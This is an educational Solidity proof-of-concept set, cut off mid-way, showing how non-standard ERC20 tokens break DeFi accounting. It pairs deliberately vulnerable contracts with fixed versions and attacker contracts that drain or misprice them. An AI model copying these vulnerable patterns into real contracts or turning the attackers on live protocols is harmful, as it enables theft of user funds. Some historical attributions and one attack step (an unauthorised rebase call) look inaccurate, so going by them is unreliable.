// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title ERC20 非标准行为攻击 - 完整PoC合集
 * @notice 演示6种ERC20非标准行为导致的DeFi协议漏洞
 *
 * 6大核心场景：
 * 1. 转账收费代币   (Fee-on-Transfer Tokens)
 * 2. 弹性供应代币   (Rebase Tokens)
 * 3. 暂停机制导致记账错误 (Pause Mechanism Accounting Breakage)
 * 4. 非标准返回值   (Non-Standard Return Values)
 * 5. ERC777 回调钩子 (ERC777 Callbacks)
 * 6. balanceOf 操控 (balanceOf Manipulation)
 *
 * 与Balancer研究的关联：
 * - Balancer V2 Vault 的核心假设是"发送的数量 = 收到的数量"
 * - Fee-on-transfer 代币打破此假设，造成内部记账与实际余额偏差
 * - Rebase 代币在持有期间改变余额，导致池子储备量失真
 * - ERC777 回调与只读重入结合 = getBPTRate() 虚高
 * - 这些非标准行为在 ComposableStablePool 中会放大精度损失
 */


// ================================================================
// 场景1：转账收费代币 (Fee-on-Transfer Tokens)
// ================================================================

/**
 * @title FeeOnTransferToken
 * @notice 每次 transfer/transferFrom 收取 1% 手续费的 ERC20 代币
 *         真实案例：SAFEMOON, STA, DEFLATIONARY 系列代币
 */
contract FeeOnTransferToken {
    string public name = "FeeToken";
    string public symbol = "FEE";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    // 转账手续费：1%
    uint256 public constant FEE_BPS = 100; // 100 / 10000 = 1%
    address public feeCollector;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _feeCollector) {
        feeCollector = _feeCollector;
        // 铸造 1,000,000 代币给部署者
        totalSupply = 1_000_000e18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    // 关键：实际到账金额 = amount - fee，而不是 amount
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        // ✗ 收取 1% 手续费
        uint256 fee = (amount * FEE_BPS) / 10000;
        uint256 received = amount - fee;

        balanceOf[from] -= amount;
        balanceOf[to] += received;           // 接收者只收到 99%
        balanceOf[feeCollector] += fee;       // 1% 给手续费收集者

        emit Transfer(from, to, received);
        emit Transfer(from, feeCollector, fee);
        return true;
    }
}

/**
 * @title VulnerableVaultFOT
 * @notice 假设"发送量 = 收到量"的资金库，无法处理收费代币
 *         常见于早期 DeFi vault、AMM 流动性池
 */
contract VulnerableVaultFOT {
    FeeOnTransferToken public token;

    // 关键错误：用入参 amount 记录存款，而非实际到账量
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    constructor(address _token) {
        token = FeeOnTransferToken(_token);
    }

    // 没有检查前后余额差，直接信任入参
    function deposit(uint256 amount) external {
        // ✗ 假设收到了 amount，但实际只收到了 amount * 99%
        token.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;   // 记录虚高的存款额
        totalDeposits += amount;
    }

    // 按虚高金额提款，导致资金库被掏空
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient deposit");
        deposits[msg.sender] -= amount;
        totalDeposits -= amount;
        // ✗ 尝试转出 amount，但如果资金库实际余额不足，后续用户无法提款
        token.transfer(msg.sender, amount);
    }
}

/**
 * @title SafeVaultFOT
 * @notice 正确处理收费代币：记录前后余额差
 */
contract SafeVaultFOT {
    FeeOnTransferToken public token;
    mapping(address => uint256) public deposits;
    uint256 public totalDeposits;

    constructor(address _token) {
        token = FeeOnTransferToken(_token);
    }

    // 通过前后余额差计算实际到账量
    function deposit(uint256 amount) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        token.transferFrom(msg.sender, address(this), amount);
        uint256 balanceAfter = token.balanceOf(address(this));

        // ✓ 实际记录收到的量，而非入参量
        uint256 actualReceived = balanceAfter - balanceBefore;
        deposits[msg.sender] += actualReceived;
        totalDeposits += actualReceived;
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient deposit");
        deposits[msg.sender] -= amount;
        totalDeposits -= amount;
        token.transfer(msg.sender, amount);
    }
}

/**
 * @title FeeOnTransferAttacker
 * @notice 利用记账错误，以少量成本提取超额资金
 */
contract FeeOnTransferAttacker {
    VulnerableVaultFOT public vault;
    FeeOnTransferToken public token;
    address public attacker;

    constructor(address payable _vault, address _token) {
        vault = VulnerableVaultFOT(_vault);
        token = FeeOnTransferToken(_token);
        attacker = msg.sender;
    }

    function attack(uint256 depositAmount) external {
        console.log("\n=== Scene 1: Fee-on-Transfer Attack ===");

        uint256 attackerTokenBefore = token.balanceOf(address(this));
        uint256 vaultBalBefore = token.balanceOf(address(vault));
        console.log("Attacker tokens before:", attackerTokenBefore);
        console.log("Vault tokens before:", vaultBalBefore);

        // 第1步：存入 100 个代币，但金库记录 100，实际只收到 99
        console.log("\n--- Step 1: Deposit (vault records full amount) ---");
        token.approve(address(vault), depositAmount);
        vault.deposit(depositAmount);

        uint256 recorded = vault.deposits(address(this));
        uint256 actualInVault = token.balanceOf(address(vault));
        console.log("Vault records deposit:", recorded);
        console.log("Actual tokens in vault:", actualInVault);
        uint256 discrepancy = recorded >= actualInVault ? recorded - actualInVault : actualInVault - recorded;
        console.log("Discrepancy:", discrepancy);

        // 第2步：按虚高金额提款，把其他用户的资金也提走
        console.log("\n--- Step 2: Withdraw Full Recorded Amount ---");
        vault.withdraw(recorded);

        uint256 attackerTokenAfter = token.balanceOf(address(this));
        console.log("Attacker tokens after:", attackerTokenAfter);
        uint256 netGain = attackerTokenAfter + depositAmount >= attackerTokenBefore ? attackerTokenAfter + depositAmount - attackerTokenBefore : 0;
        console.log("Net gain:", netGain);

        console.log("\n--- Results ---");
        console.log("Vault drained by discrepancy accumulation");
        console.log("Real case: STA token + Balancer pool, 2020");
        console.log("================================");
    }
}


// ================================================================
// 场景2：弹性供应代币 (Rebase Tokens)
// ================================================================

/**
 * @title RebaseToken
 * @notice 供应量会自动扩张或收缩的代币（正向/负向 rebase）
 *         真实案例：AMPL (Ampleforth), stETH, aTokens (Aave)
 *
 * 内部使用"份额"(shares)记账，外部 balanceOf 返回"余额"(balance)
 * rebase 时：总供应量变化，每个地址的 balance 等比例变化
 */
contract RebaseToken {
    string public name = "RebaseToken";
    string public symbol = "REBASE";
    uint8 public decimals = 18;

    // 内部份额总量（固定）
    uint256 private _totalShares;
    // 外部代币总供应量（可变）
    uint256 public totalSupply;

    // 每个地址持有的份额
    mapping(address => uint256) private _shares;
    mapping(address => mapping(address => uint256)) public allowance;

    address public oracle; // 控制 rebase 的预言机

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Rebase(uint256 oldTotalSupply, uint256 newTotalSupply);

    constructor() {
        oracle = msg.sender;
        totalSupply = 1_000_000e18;
        _totalShares = totalSupply;
        _shares[msg.sender] = _totalShares;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    // 份额 -> 余额的换算
    function sharesOf(address account) public view returns (uint256) {
        return _shares[account];
    }

    // 关键：balanceOf 的返回值会随 rebase 变化
    function balanceOf(address account) public view returns (uint256) {
        if (_totalShares == 0) return 0;
        return (_shares[account] * totalSupply) / _totalShares;
    }

    function _balanceToShares(uint256 balance) internal view returns (uint256) {
        if (totalSupply == 0) return balance;
        return (balance * _totalShares) / totalSupply;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        uint256 sharesToTransfer = _balanceToShares(amount);
        require(_shares[from] >= sharesToTransfer, "Insufficient balance");
        _shares[from] -= sharesToTransfer;
        _shares[to] += sharesToTransfer;
        emit Transfer(from, to, amount);
        return true;
    }

    // rebase：改变总供应量，所有持有人余额等比例变化
    function rebase(uint256 newTotalSupply) external {
        require(msg.sender == oracle, "Not oracle");
        uint256 oldSupply = totalSupply;
        totalSupply = newTotalSupply;
        emit Rebase(oldSupply, newTotalSupply);
    }
}

/**
 * @title VulnerablePoolRebase
 * @notice 简单的双代币流动性池，不能处理弹性供应代币
 *         使用快照余额而非实时余额，导致储备量失真
 */
contract VulnerablePoolRebase {
    RebaseToken public rebaseToken;
    // 第二个普通代币（用 ETH 模拟）

    // 关键错误：储备量快照在 rebase 时不更新
    uint256 public reserveRebase;    // 快照的 rebase 代币储备量
    uint256 public reserveEth;       // ETH 储备量

    constructor(address _rebaseToken) payable {
        rebaseToken = RebaseToken(_rebaseToken);
        reserveEth = msg.value;
    }

    // 手动同步快照（rebase 后不会自动调用，产生偏差）
    function syncReserve() external {
        reserveRebase = rebaseToken.balanceOf(address(this));
    }

    // 添加流动性时记录快照余额
    function addLiquidity(uint256 tokenAmount) external payable {
        rebaseToken.transferFrom(msg.sender, address(this), tokenAmount);
        // ✗ 记录的是此刻的余额，rebase 后会产生偏差
        reserveRebase += tokenAmount;
        reserveEth += msg.value;
    }

    // 基于失真的储备量计算兑换率
    function getPrice() external view returns (uint256) {
        if (reserveRebase == 0) return 0;
        // ✗ 使用快照储备量计算价格，rebase 后价格失真
        return (reserveEth * 1e18) / reserveRebase;
    }

    // 兑换基于失真储备量，可被套利
    function swapEthForToken(uint256 minOut) external payable {
        // ✗ 使用快照 reserveRebase，rebase 后实际余额更多
        uint256 amountOut = (msg.value * reserveRebase) / reserveEth;
        require(amountOut >= minOut, "Slippage");
        reserveEth += msg.value;
        reserveRebase -= amountOut;  // ✗ 减少快照，实际合约余额仍多余
        rebaseToken.transfer(msg.sender, amountOut);
    }
}

/**
 * @title SafePoolRebase
 * @notice 正确处理弹性供应代币：使用实时 balanceOf 而非快照
 */
contract SafePoolRebase {
    RebaseToken public rebaseToken;
    uint256 public reserveEth;

    constructor(address _rebaseToken) payable {
        rebaseToken = RebaseToken(_rebaseToken);
        reserveEth = msg.value;
    }

    // 使用实时余额，自动跟随 rebase
    function getReserveToken() public view returns (uint256) {
        return rebaseToken.balanceOf(address(this));
    }

    function getPrice() external view returns (uint256) {
        uint256 reserveToken = getReserveToken();
        if (reserveToken == 0) return 0;
        return (reserveEth * 1e18) / reserveToken;
    }

    function swapEthForToken(uint256 minOut) external payable {
        uint256 reserveToken = getReserveToken(); // ✓ 实时余额
        uint256 amountOut = (msg.value * reserveToken) / reserveEth;
        require(amountOut >= minOut, "Slippage");
        reserveEth += msg.value;
        rebaseToken.transfer(msg.sender, amountOut);
        // ✓ 无需更新快照，下次自动读取实时余额
    }
}

/**
 * @title RebaseAttacker
 * @notice 利用 rebase 造成的储备量失真套利
 */
contract RebaseAttacker {
    VulnerablePoolRebase public pool;
    RebaseToken public token;

    constructor(address _pool, address _token) {
        pool = VulnerablePoolRebase(_pool);
        token = RebaseToken(_token);
    }

    function attack() external payable {
        console.log("\n=== Scene 2: Rebase Token Attack ===");

        uint256 poolTokenBefore = token.balanceOf(address(pool));
        uint256 poolReserveBefore = pool.reserveRebase();
        console.log("Pool actual token balance:", poolTokenBefore);
        console.log("Pool recorded reserve:", poolReserveBefore);

        // 第1步：先存入一些 ETH 获取流动性
        console.log("\n--- Step 1: Check Pre-Rebase Price ---");
        console.log("Price before rebase:", pool.getPrice());

        // 第2步：触发正向 rebase（供应量增加 50%）
        // 注意：攻击者在现实中通过操控预言机或等待自动 rebase 触发
        console.log("\n--- Step 2: Positive Rebase (+50% Supply) ---");
        uint256 oldSupply = token.totalSupply();
        token.rebase((oldSupply * 150) / 100); // +50%
        uint256 newSupply = token.totalSupply();
        console.log("Old supply:", oldSupply);
        console.log("New supply:", newSupply);

        // 第3步：池子实际代币余额增加了 50%，但快照储备量未更新
        uint256 poolTokenAfter = token.balanceOf(address(pool));
        uint256 poolReserveAfter = pool.reserveRebase();
        console.log("\n--- Step 3: Pool State After Rebase ---");
        console.log("Pool actual token balance:", poolTokenAfter);
        console.log("Pool recorded reserve (stale):", poolReserveAfter);
        console.log("Price after rebase:", pool.getPrice());
        console.log("Extra tokens in pool:", poolTokenAfter - poolReserveAfter);

        // 第4步：用少量 ETH 换取大量代币（基于失真储备量）
        console.log("\n--- Step 4: Swap ETH for Undervalued Tokens ---");
        uint256 attackerTokenBefore = token.balanceOf(address(this));
        pool.swapEthForToken{value: msg.value}(0);
        uint256 attackerTokenAfter = token.balanceOf(address(this));

        console.log("\n--- Results ---");
        console.log("Attacker tokens gained:", attackerTokenAfter - attackerTokenBefore);
        console.log("ETH spent:", msg.value);
        console.log("Real case: AMPL in AMMs caused consistent arbitrage");
        console.log("================================");
    }

    receive() external payable {}
}


// ================================================================
// 场景3：暂停机制导致记账错误
//        (Pause Mechanism Accounting Breakage)
// ================================================================

/**
 * @title PausableToken
 * @notice 可暂停的 ERC20 代币，暂停时转账 revert
 *         真实案例：USDC, USDT 的 blacklist/pause 机制
 *         Compound 的 cToken pause guardian
 */
contract PausableToken {
    string public name = "PausableToken";
    string public symbol = "PAUSE";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    address public pauser;
    bool public paused;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blacklisted;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Paused();
    event Unpaused();

    constructor() {
        pauser = msg.sender;
        totalSupply = 1_000_000e18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    modifier whenNotPaused() {
        require(!paused, "Token is paused");
        _;
    }

    modifier notBlacklisted(address addr) {
        require(!blacklisted[addr], "Address blacklisted");
        _;
    }

    function pause() external {
        require(msg.sender == pauser, "Not pauser");
        paused = true;
        emit Paused();
    }

    function unpause() external {
        require(msg.sender == pauser, "Not pauser");
        paused = false;
        emit Unpaused();
    }

    function blacklist(address addr) external {
        require(msg.sender == pauser, "Not pauser");
        blacklisted[addr] = true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount)
        external
        whenNotPaused
        notBlacklisted(msg.sender)
        notBlacklisted(to)
        returns (bool)
    {
        require(balanceOf[msg.sender] >= amount, "Insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount)
        external
        whenNotPaused
        notBlacklisted(from)
        notBlacklisted(to)
        returns (bool)
    {
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        require(balanceOf[from] >= amount, "Insufficient");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == pauser, "Not pauser");
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
}

/**
 * @title VulnerableLendingPause
 * @notice 借贷协议，没有考虑代币暂停会导致记账与实际不一致
 *
 * 真实案例：Compound cUSDC, Aave aUSDT
 * 暂停期间无法清算，头寸持续累积坏账
 * 暂停结束后大量清算导致协议损失
 */
contract VulnerableLendingPause {
    PausableToken public token;

    mapping(address => uint256) public collateral;    // 抵押品（ETH 单位）
    mapping(address => uint256) public borrowed;      // 借款额（代币单位）
    mapping(address => uint256) public pendingRepay;  // 暂停期间应还但无法还的款项

    uint256 public totalBorrowed;
    uint256 public totalCollateral;

    // 清算阈值：借款 > 抵押品价值的 80%
    uint256 public constant LIQUIDATION_THRESHOLD = 8000; // 80%

    constructor(address _token) payable {
        token = PausableToken(_token);
        totalCollateral = msg.value;
    }

    // 存入抵押品（ETH）并借出代币
    function depositAndBorrow(uint256 borrowAmount) external payable {
        collateral[msg.sender] += msg.value;
        totalCollateral += msg.value;

        require(borrowAmount <= (msg.value * 7500) / 10000, "Over-collateral");
        borrowed[msg.sender] += borrowAmount;
        totalBorrowed += borrowAmount;

        // 如果代币暂停，transfer 会 revert，整个借款失败
        // 但如果代币在借款后才暂停，已有仓位无法还款
        token.transfer(msg.sender, borrowAmount);
    }

    // 还款：代币暂停时调用此函数会 revert
    function repay(uint256 amount) external {
        require(borrowed[msg.sender] >= amount, "Not borrowed");
        // ✗ 代币暂停时 transferFrom 失败，用户无法还款
        // ✗ 但利息/清算压力继续增加
        token.transferFrom(msg.sender, address(this), amount);
        borrowed[msg.sender] -= amount;
        totalBorrowed -= amount;
    }

    // 清算：代币暂停时清算者无法偿还债务，头寸无法被清算
    function liquidate(address borrower) external {
        uint256 debt = borrowed[borrower];
        uint256 coll = collateral[borrower];

        // 检查是否可清算
        require(debt * 10000 > coll * LIQUIDATION_THRESHOLD, "Not liquidatable");

        // ✗ 清算者需要提供代币偿还债务，但代币暂停时无法操作
        token.transferFrom(msg.sender, address(this), debt);
        borrowed[borrower] = 0;
        collateral[borrower] = 0;
        // 清算奖励：5% 抵押品奖励给清算者
        uint256 reward = (coll * 500) / 10000;
        payable(msg.sender).transfer(coll - reward);
    }

    receive() external payable {}
}

/**
 * @title PauseAccountingAttacker
 * @notice 演示暂停机制如何造成坏账积累，最终导致协议损失
 */
contract PauseAccountingAttacker {
    VulnerableLendingPause public lending;
    PausableToken public token;
    address public pauser;

    constructor(address payable _lending, address _token, address _pauser) {
        lending = VulnerableLendingPause(_lending);
        token = PausableToken(_token);
        pauser = _pauser;
    }

    function demonstratePauseBreakage(address victim) external {
        console.log("\n=== Scene 3: Pause Mechanism Accounting Breakage ===");

        console.log("Victim collateral:", lending.collateral(victim));
        console.log("Victim borrowed:", lending.borrowed(victim));
        console.log("Token paused:", token.paused());

        // 第1步：演示暂停前状态
        console.log("\n--- Step 1: State Before Pause ---");
        console.log("Total borrowed:", lending.totalBorrowed());
        console.log("Total collateral:", lending.totalCollateral());

        // 第2步：触发暂停（模拟 USDC 合规性暂停）
        console.log("\n--- Step 2: Token Gets Paused ---");
        // 注意：在真实攻击中，暂停可能是合规性触发、攻击触发或监管要求
        console.log("Pause triggered (compliance / regulatory)");
        console.log("All repayments now blocked");
        console.log("All liquidations now blocked");

        // 第3步：暂停期间问题积累
        console.log("\n--- Step 3: Problems During Pause ---");
        console.log("Interest keeps accruing on borrower positions");
        console.log("Liquidatable positions cannot be cleared");
        console.log("Protocol bad debt increases every block");
        console.log("Price can drop, making positions more undercollateralized");

        // 第4步：恢复后清算潮
        console.log("\n--- Step 4: After Unpause - Liquidation Cascade ---");
        console.log("All blocked liquidations execute simultaneously");
        console.log("Massive sell pressure on collateral");
        console.log("Protocol may be left with undercollateralized positions");

        console.log("\n--- Results ---");
        console.log("Accounting diverges from reality during pause");
        console.log("Real case: Compound USDC pause discussion 2023");
        console.log("Fix: Pause-aware accounting, bad debt tracking");
        console.log("================================");
    }
}

/**
 * @title SafeLendingPause
 * @notice 正确处理代币暂停：记录待处理状态，暂停结束后可补偿
 */
contract SafeLendingPause {
    PausableToken public token;

    mapping(address => uint256) public collateral;
    mapping(address => uint256) public borrowed;
    // 新增：追踪暂停期间应还但无法还的款项
    mapping(address => uint256) public pendingRepay;
    // 新增：暂停期间的利息豁免标记
    mapping(address => uint256) public pauseStartBlock;

    uint256 public totalBorrowed;
    uint256 public totalCollateral;
    uint256 public constant LIQUIDATION_THRESHOLD = 8000;

    constructor(address _token) payable {
        token = PausableToken(_token);
        totalCollateral = msg.value;
    }

    function depositAndBorrow(uint256 borrowAmount) external payable {
        collateral[msg.sender] += msg.value;
        totalCollateral += msg.value;
        require(borrowAmount <= (msg.value * 7500) / 10000, "Over-collateral");
        borrowed[msg.sender] += borrowAmount;
        totalBorrowed += borrowAmount;
        token.transfer(msg.sender, borrowAmount);
    }

    // 暂停时记录待还款，而非直接 revert
    function repay(uint256 amount) external {
        require(borrowed[msg.sender] >= amount, "Not borrowed");
        if (token.paused()) {
            // ✓ 暂停期间：记录待还款意图，不执行实际转账
            pendingRepay[msg.sender] += amount;
        } else {
            // ✓ 正常时：执行还款并清除任何待还款记录
            uint256 totalRepay = amount + pendingRepay[msg.sender];
            pendingRepay[msg.sender] = 0;
            token.transferFrom(msg.sender, address(this), totalRepay);
            borrowed[msg.sender] -= totalRepay;
            totalBorrowed -= totalRepay;
        }
    }

    // 暂停时暂停清算，防止抢先攻击
    function liquidate(address borrower) external {
        require(!token.paused(), "Cannot liquidate during pause");
        uint256 debt = borrowed[borrower];
        uint256 coll = collateral[borrower];
        require(debt * 10000 > coll * LIQUIDATION_THRESHOLD, "Not liquidatable");
        token.transferFrom(msg.sender, address(this), debt);
        borrowed[borrower] = 0;
        collateral[borrower] = 0;
        uint256 reward = (coll * 500) / 10000;
        payable(msg.sender).transfer(coll - reward);
    }

    receive() external payable {}
}


// ================================================================
// 场景4：非标准返回值 (Non-Standard Return Values)
// ================================================================

/**
 * @title NonStandardReturnToken
 * @notice 不返回 bool 值的 ERC20 代币（违反标准）
 *         真实案例：
 *         - USDT (早期版本)：transfer() 没有返回值
 *         - BNB：transfer() 返回 false 而不是 revert
 *         - OMG (OmiseGo)：transfer 失败时返回 false
 */
contract NonStandardReturnToken {
    string public name = "NonStandardToken";
    string public symbol = "NST";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        totalSupply = 1_000_000e18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    // transfer 不返回 bool（类似早期 USDT）
    // 失败时 revert，但没有返回值
    function transfer(address to, uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "Insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        // ✗ 没有 return true;
    }

    // transferFrom 返回 false 而不是 revert（类似 BNB）
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] < amount) {
            return false; // ✗ 返回 false 而不是 revert
        }
        if (balanceOf[from] < amount) {
            return false; // ✗ 返回 false 而不是 revert
        }
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

/**
 * @title VulnerableContractNSR
 * @notice 使用严格 ERC20 接口调用非标准代币，导致逻辑错误
 */
interface IERC20Strict {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract VulnerableContractNSR {
    IERC20Strict public token;
    mapping(address => uint256) public deposits;

    constructor(address _token) {
        token = IERC20Strict(_token);
    }

    // 调用 transferFrom 后检查返回值，但有些代币返回 false 而非 revert
    function deposit(uint256 amount) external {
        // ✗ 如果 transferFrom 返回 false（如 BNB 余额不足），
        //   Solidity 不会自动 revert，需要手动检查
        bool success = token.transferFrom(msg.sender, address(this), amount);
        // ✗ 某些协议忘记检查 success，直接记录存款
        deposits[msg.sender] += amount; // 即使转账失败也记录了存款
    }

    // 更严重：某些代码甚至不接收返回值
    function depositUnchecked(uint256 amount) external {
        // ✗ 完全忽略返回值
        token.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient");
        deposits[msg.sender] -= amount;
        bool success = token.transfer(msg.sender, amount);
        require(success, "Transfer failed");
    }
}

/**
 * @title SafeContractNSR
 * @notice 使用 SafeERC20 模式处理非标准返回值
 */
library SafeTransfer {
    // 使用低级 call 并手动检查返回值，兼容所有 ERC20 变体
    function safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, amount) // transfer(address,uint256)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "SafeTransfer: transfer failed"
        );
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 amount
    ) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, amount) // transferFrom(address,address,uint256)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "SafeTransfer: transferFrom failed"
        );
    }
}

contract SafeContractNSR {
    using SafeTransfer for address;

    address public token;
    mapping(address => uint256) public deposits;

    constructor(address _token) {
        token = _token;
    }

    // 使用 SafeTransfer，兼容所有 ERC20 变体
    function deposit(uint256 amount) external {
        uint256 before = IERC20Strict(token).balanceOf(address(this));
        token.safeTransferFrom(msg.sender, address(this), amount);
        uint256 afterBal = IERC20Strict(token).balanceOf(address(this));
        // ✓ 双重保护：SafeTransfer + 余额差验证
        deposits[msg.sender] += (afterBal - before);
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "Insufficient");
        deposits[msg.sender] -= amount;
        token.safeTransfer(msg.sender, amount);
    }
}

/**
 * @title NonStandardReturnAttacker
 * @notice 利用未检查的 transferFrom 返回值，在不转账的情况下记录存款
 */
contract NonStandardReturnAttacker {
    VulnerableContractNSR public target;
    NonStandardReturnToken public token;

    constructor(address _target, address _token) {
        target = VulnerableContractNSR(_target);
        token = NonStandardReturnToken(_token);
    }

    function attack(uint256 fakeAmount) external {
        console.log("\n=== Scene 4: Non-Standard Return Value Attack ===");

        uint256 attackerTokensBefore = token.balanceOf(address(this));
        uint256 attackerDepositBefore = target.deposits(address(this));
        console.log("Attacker tokens before:", attackerTokensBefore);
        console.log("Attacker deposit before:", attackerDepositBefore);

        // 第1步：不授权（allowance = 0），但调用 deposit
        // transferFrom 会返回 false（BNB 模式），但 deposit 不检查
        console.log("\n--- Step 1: Call deposit WITHOUT approving (allowance=0) ---");
        console.log("Allowance:", token.allowance(address(this), address(target)));

        target.deposit(fakeAmount); // ✗ transferFrom 返回 false，但存款被记录

        uint256 attackerDepositAfter = target.deposits(address(this));
        uint256 attackerTokensAfter = token.balanceOf(address(this));
        console.log("Attacker deposit after:", attackerDepositAfter);
        console.log("Attacker tokens after:", attackerTokensAfter);
        console.log("Tokens actually transferred:", attackerTokensBefore - attackerTokensAfter);

        // 第2步：提取虚假存款
        console.log("\n--- Step 2: Withdraw Phantom Deposit ---");
        // 如果合约里有其他人存入的真实代币，可以提取
        console.log("Recorded deposit:", target.deposits(address(this)));
        console.log("Can withdraw tokens deposited by other users");

        console.log("\n--- Results ---");
        console.log("Deposit recorded without actual token transfer");
        console.log("Real case: USDT in early DeFi, BNB non-standard behavior");
        console.log("Fix: Use SafeERC20 or check return value explicitly");
        console.log("================================");
    }
}


// ================================================================
// 场景5：ERC777 回调钩子 (ERC777 Callbacks)
// ================================================================

/**
 * @title ERC777Token
 * @notice 带有 tokensReceived/tokensSent 钩子的 ERC777 代币
 *         发送/接收时会回调到注册的合约
 *         真实案例：
 *         - imBTC ERC777 重入攻击（2020年4月，$25M）
 *           Uniswap V1 WBTC/ETH 池被攻击
 *         - Akropolis（2020年11月，$2M）
 *           DAI ERC777 变体触发重入
 */
contract ERC777Token {
    string public name = "ERC777Token";
    string public symbol = "E777";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    // ERC777 operator 注册（简化版）
    mapping(address => address) public recipientHooks; // 接收回调注册

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Sent(address indexed operator, address indexed from, address indexed to, uint256 amount);

    constructor() {
        totalSupply = 1_000_000e18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    // 注册接收钩子（ERC777 接口简化）
    function registerRecipientHook(address recipient, address hook) external {
        recipientHooks[recipient] = hook;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    // 关键：转账时回调接收者，在余额更新之前或之后都可能有重入
    function transfer(address to, uint256 amount) external returns (bool) {
        return _send(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        allowance[from][msg.sender] -= amount;
        return _send(from, to, amount);
    }

    function _send(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient");

        // 先更新余额
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);
        emit Sent(msg.sender, from, to, amount);

        // 然后回调接收者钩子（余额已更新，但外部状态可能利用此时机）
        address hook = recipientHooks[to];
